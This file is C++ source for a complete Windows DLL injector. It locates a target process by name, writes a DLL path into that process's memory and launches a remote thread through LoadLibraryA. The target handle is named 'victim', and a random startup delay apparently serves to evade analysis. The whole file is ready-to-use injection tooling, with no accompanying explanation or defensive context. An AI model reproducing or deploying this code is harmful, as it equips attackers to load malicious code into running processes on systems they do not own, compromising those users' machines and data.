#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <stdio.h>
#include <time.h>

using namespace std;


DWORD getPID(char* processName){
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(snapshot == INVALID_HANDLE_VALUE){
        printf("Couldnt get the process' snapshot, proceeding to inject into itself...");
        return 0;
    }
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if(!Process32First(snapshot, &pe32)){
        CloseHandle(snapshot);
        return 0;
    }
    do{
        if(!strcmp(pe32.szExeFile, processName)){
            CloseHandle(snapshot);
            return pe32.th32ProcessID;
        }
    }while(Process32Next(snapshot, &pe32));

    return 0;
}


int main(int argc, char** argv){
    srand(time(NULL)); 
    Sleep(rand() % 6000);
    if(argc != 3){
        printf("Usage: xxx.exe <process_name> <dll_path>\n");
        return 0;
    }

    char* processName = argv[1];
    PCSTR dllPath = argv[2];
    DWORD PID = getPID(processName);
    HANDLE victim = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE| PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, 0, PID);
    if(victim == NULL || victim == INVALID_HANDLE_VALUE){
        printf("failed to open process Error: %d\n", GetLastError());
        return 0;
    }

    size_t reqMem = strlen(dllPath) + 1;
    LPVOID allocMem = VirtualAllocEx(victim, NULL, reqMem, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if(allocMem == NULL){
        printf("allocMem failed Error: %d\n", GetLastError());
        return 0;
    }
    SIZE_T bytesWritten = 0;
    if(!WriteProcessMemory(victim, allocMem, dllPath, reqMem, &bytesWritten)){
        printf("WriteProcessMemory failed. Error: %d\n", GetLastError());
        return 0;
    }
    HMODULE kernel32Base = GetModuleHandleW(L"kernel32.dll");
    if(kernel32Base == NULL){
        printf("GetModuleHandle failed Error: %d\n", GetLastError());
        return 0;
    }
    FARPROC loadLibraryAddr = GetProcAddress(kernel32Base, "LoadLibraryA");
    if(loadLibraryAddr == NULL){
        printf("loadLibraryAddr failed. Error: %d\n", GetLastError());
        return 0;
    }
    
    HANDLE threadHandle = CreateRemoteThread(victim, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, allocMem, 0, NULL);
    if(threadHandle == NULL){
        printf("CreateRemoteThread failed. Error: %d\n", GetLastError());
        return 0;
    }
    WaitForSingleObject(threadHandle, INFINITE);
    CloseHandle(threadHandle);
    VirtualFreeEx(victim, allocMem, 0, MEM_RELEASE);
    CloseHandle(victim);
    




}



